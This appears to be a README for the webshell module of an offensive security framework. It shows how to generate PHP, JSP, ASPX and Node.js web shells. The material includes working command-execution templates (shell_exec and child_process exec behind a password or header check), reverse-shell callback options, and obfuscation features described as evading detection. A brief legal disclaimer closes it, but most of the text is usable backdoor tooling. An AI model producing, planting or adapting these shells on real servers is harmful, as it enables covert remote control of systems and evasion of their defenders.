# Webshell Data and Connectors

This directory contains webshell templates, generators, and connectors for creating platform-specific web shells across multiple languages and frameworks.

## Directory Structure

```
webshell/
├── factory.py            # WebShell factory for creating instances
├── templates.py          # Template management and rendering
├── connectors/           # Webshell connector implementations
│   ├── base.py          # Base webshell connector class
│   ├── example_connector.py  # Example custom connector
│   ├── remote.py        # Remote webshell fetching
│   └── template.py      # Template-based connector
└── generators/           # Language-specific webshell generators
    ├── php.py           # PHP webshell generator
    ├── jsp.py           # JSP webshell generator
    ├── aspx.py          # ASPX webshell generator
    ├── asp.py           # Classic ASP generator
    ├── python.py        # Python webshell generator
    ├── bash.py          # Bash webshell generator
    ├── perl.py          # Perl webshell generator
    ├── ruby.py          # Ruby webshell generator
    ├── powershell.py    # PowerShell webshell generator
    └── java.py          # Java servlet generator
```

## Supported Languages

### PHP Webshells

Generate PHP webshells with various features:

```python
from ofx.api.exploitation.webshell.shell.php import PhpShell

shell = PhpShell(
    password="mypass",
    encoder="base64",
    secret_header="X-Auth-Token",
    secret_value="secret123"
)

# Generate minimal shell
shell.template = "mini"
code = shell.get_webshell()

# Generate full-featured shell
shell.template = "full"
code = shell.get_webshell()
```

**Templates Available:**
- `mini` - Minimal single-line shell
- `default` - Standard shell with basic features
- `full` - Feature-rich shell with file upload, command execution
- `stealth` - Obfuscated shell with anti-detection

### JSP Webshells

Java Server Pages webshells:

```python
from ofx.api.exploitation.webshell.shell.jsp import JspShell

shell = JspShell(password="admin")
code = shell.get_webshell()
```

### ASPX Webshells

ASP.NET webshells for IIS servers:

```python
from ofx.api.exploitation.webshell.shell.aspx import AspxShell

shell = AspxShell(
    password="pass123",
    encoder="base64"
)
code = shell.get_webshell()
```

### Python/Bash Operation Snippets

Use the code factory to generate language-specific snippets:

```python
from ofx.api.exploitation.webshell.factory import WebShellCodeFactory

python_rev = WebShellCodeFactory.reverse_shell("python", "127.0.0.1", 4444)
bash_rev = WebShellCodeFactory.reverse_shell("bash", "127.0.0.1", 4444)
```

## Webshell Factory

The factory pattern provides a unified interface for creating webshells:

```python
from ofx.api.exploitation.webshell.factory import WebShellCodeFactory

# Generate operation snippets
cmd = WebShellCodeFactory.run_command("php", "id")
read = WebShellCodeFactory.read_file("jsp", "/opt/app/data.xml")
upload = WebShellCodeFactory.upload_file("asp", "shell.asp", "BASE64DATA")
```

## Template System

### Using Built-in Templates

```python
from ofx.api.exploitation.webshell.shell.php import PhpShell

shell = PhpShell(password="pass")

# List available templates
templates = shell.list_templates()
print(templates)  # ['mini', 'default', 'full', 'stealth']

# Use specific template
shell.template = "stealth"
code = shell.get_webshell()
```

### Creating Custom Templates

Templates use Jinja2 syntax with special placeholders:

```python
from ofx.api.exploitation.webshell.shell.php import PhpShell

# Define custom template
custom_template = '''<?php
$auth = $_SERVER['HTTP_{{SECRET_HEADER}}'];
if ($auth === '{{SECRET_VALUE}}') {
    $cmd = $_POST['{{PASSWORD}}'];
    if ({{ENCODER}}) {
        $cmd = base64_decode($cmd);
    }
    echo shell_exec($cmd);
}
?>'''

# Register template
PhpShell.register_template("custom", custom_template)

# Use custom template
shell = PhpShell(password="cmd")
shell.template = "custom"
code = shell.get_webshell()
```

### Template Placeholders

Common placeholders used in templates:

- `{{PASSWORD}}` - Command parameter name
- `{{ENCODER}}` - Encoding method (base64, rot13, etc.)
- `{{SECRET_HEADER}}` - HTTP header for authentication
- `{{SECRET_VALUE}}` - Expected header value
- `{{SHELL_NAME}}` - Custom shell identifier
- `{{UPLOAD_DIR}}` - Upload directory path
- `{{MAX_SIZE}}` - Maximum upload size

## Webshell Connectors

### Base Connector

Create custom webshell connectors:

```python
from ofx.api.exploitation.webshell.connectors.base import WebshellConnector

class MyWebShell(WebshellConnector):
    def __init__(self, password="default"):
        super().__init__(language="php")
        self.password = password
    
    def generate(self) -> str:
        template = self.get_template("custom")
        return self.render_template(template, {
            'password': self.password
        })
```

### Remote Connector

Fetch webshells from remote sources:

```python
from ofx.api.exploitation.webshell.connectors.remote import RemoteHTTPConnector

connector = RemoteHTTPConnector(
    url="https://example.com/shells/php-shell.php"
)
shell_code = connector.fetch()
```

### Template Connector

Use template files directly:

```python
from ofx.api.exploitation.webshell.connectors.template import TemplateConnector

connector = TemplateConnector(
    template_file="my_shell.php.j2",
    variables={
        'password': 'secret',
        'auth_key': 'xyz123'
    }
)
shell_code = connector.generate()
```

## Using Webshells in Workflows

### Basic Generation

```yaml
name: Generate Webshell
jobs:
  create_shell:
    steps:
      - name: Generate PHP shell
        script: |
          from ofx.api.exploitation.webshell.shell.php import PhpShell
          
          shell = PhpShell(
              password="cmd",
              encoder="base64",
              template="stealth"
          )
          
          code = shell.get_webshell()
          
          # Save to file
          with open('shell.php', 'w') as f:
              f.write(code)
          
          print("Webshell generated: shell.php")
```

### Multiple Languages

```yaml
name: Generate Multiple Webshells
jobs:
  generate_shells:
    steps:
      - name: Generate all types
        script: |
          from ofx.api.exploitation.webshell.shell.php import PhpShell
          from ofx.api.exploitation.webshell.shell.jsp import JspShell
          from ofx.api.exploitation.webshell.shell.aspx import AspxShell
          
          shells = {"php": PhpShell, "jsp": JspShell, "aspx": AspxShell}
          
          for lang, shell_cls in shells.items():
              shell = shell_cls(password="admin")
              code = shell.get_webshell()
              
              with open(f'shell.{lang}', 'w') as f:
                  f.write(code)
              
              print(f"Generated {lang} webshell")
```

### Dynamic Configuration

```yaml
name: Custom Webshell
jobs:
  create:
    steps:
      - name: Generate with inputs
        script: |
          from ofx.api.exploitation.webshell.shell.php import PhpShell
          
          shell = PhpShell(
              password="${{ inputs.password }}",
              secret_header="${{ inputs.auth_header }}",
              secret_value="${{ secrets.auth_token }}"
          )
          
          code = shell.get_webshell()
          print(code)
```

## Obfuscation Techniques

### Encoding

Apply encoding to evade detection:

```python
from ofx.api.exploitation.webshell.shell.php import PhpShell

shell = PhpShell(password="cmd", encoder="base64")
code = shell.get_webshell()

# Shell will base64-decode commands before execution
```

### Variable Randomization

Randomize variable names:

```python
shell = PhpShell(password="cmd", randomize_vars=True)
code = shell.get_webshell()
# Variables will have random names like $a1b2c3
```

### Comment Injection

Add misleading comments:

```python
shell = PhpShell(password="cmd", add_comments=True)
code = shell.get_webshell()
# Will include benign-looking comments
```

## Advanced Features

### File Upload Support

Generate shells with file upload capability:

```python
shell = PhpShell(
    password="cmd",
    template="full",
    enable_upload=True,
    upload_dir="/tmp",
    max_upload_size=10485760  # 10MB
)
```

### Database Access

Include database connection capabilities:

```python
shell = PhpShell(
    password="cmd",
    template="full",
    enable_database=True,
    db_type="mysql"  # or "postgres", "sqlite"
)
```

### Reverse Shell Integration

Embed reverse shell functionality:

```python
shell = PhpShell(
    password="cmd",
    enable_reverse_shell=True,
    callback_ip="10.0.0.1",
    callback_port=4444
)
```

## Security Considerations

### Authentication

Always use authentication mechanisms:

```python
# Password-based auth
shell = PhpShell(password="complex_password_123")

# Header-based auth
shell = PhpShell(
    password="cmd",
    secret_header="X-Custom-Auth",
    secret_value="unique_token_xyz"
)

# IP whitelist (in template)
```

### Access Control

Implement access restrictions:
- IP whitelisting
- Time-based access
- Request rate limiting
- Session management

### Operational Security

Best practices:
1. Use unique passwords per deployment
2. Enable encryption for communications
3. Implement auto-destruct mechanisms
4. Log access attempts
5. Use stealth templates in production

## Testing Webshells

### Local Testing

```python
from ofx.api.exploitation.webshell.shell.php import PhpShell
import subprocess

# Generate shell
shell = PhpShell(password="test")
code = shell.get_webshell()

# Write to file
with open('/tmp/test_shell.php', 'w') as f:
    f.write(code)

# Test with PHP built-in server
subprocess.Popen([
    'php', '-S', 'localhost:8000',
    '-t', '/tmp'
])

# Access: http://localhost:8000/test_shell.php
```

### Automated Testing

```python
import requests

# Send command
response = requests.post(
    'http://localhost:8000/test_shell.php',
    data={'test': 'echo "works"'}
)

print(response.text)  # Should output: works
```

## Creating Custom Generators

To create a generator for a new language:

1. **Create Generator Class:**

```python
# generators/nodejs.py
from ofx.api.exploitation.webshell.connectors.base import WebshellConnector

class NodeJsShell(WebshellConnector):
    def __init__(self, password="cmd", port=3000):
        super().__init__(language="nodejs")
        self.password = password
        self.port = port
    
    def generate(self) -> str:
        template = '''
const express = require('express');
const { exec } = require('child_process');
const app = express();

app.post('/shell', (req, res) => {
    const cmd = req.body.{{PASSWORD}};
    exec(cmd, (error, stdout, stderr) => {
        res.send(stdout || stderr);
    });
});

app.listen({{PORT}});
'''
        return self.render_template(template, {
            'PASSWORD': self.password,
            'PORT': self.port
        })
```

2. **Register in Factory:**

```python
# factory.py
from generators.nodejs import NodeJsShell

WebShellCodeFactory.register('nodejs', NodeJsShell)
```

## Troubleshooting

### Common Issues

**Issue:** Shell generates but doesn't execute
- Check PHP/server configuration
- Verify `exec()`, `shell_exec()` are not disabled
- Check file permissions
- Review server error logs

**Issue:** Authentication fails
- Verify password parameter matches
- Check HTTP header names (case-sensitive)
- Test with curl/postman first

**Issue:** Encoding problems
- Ensure matching encoding on client/server
- Test with plain text first
- Check character encoding (UTF-8)

## See Also

- [Webshell API Documentation](../../docs/api/exploitation/webshell.md)
- [Developing Connectors Guide](../../docs/guide/developing-connectors.md)
- [Exploitation API Overview](../../docs/api/exploitation.md)
- [Template System](../../docs/guide/templates.md)

## Best Practices

1. **Development**
   - Test in isolated environments
   - Version control your templates
   - Document custom modifications
   - Use meaningful variable names

2. **Deployment**
   - Use unique credentials
   - Implement proper authentication
   - Enable logging
   - Consider IP restrictions

3. **Maintenance**
   - Rotate credentials regularly
   - Update shells to patch vulnerabilities
   - Monitor access logs
   - Remove when no longer needed

4. **Legal & Ethical**
   - Only use on authorized systems
   - Follow responsible disclosure
   - Document all deployments
   - Comply with regulations
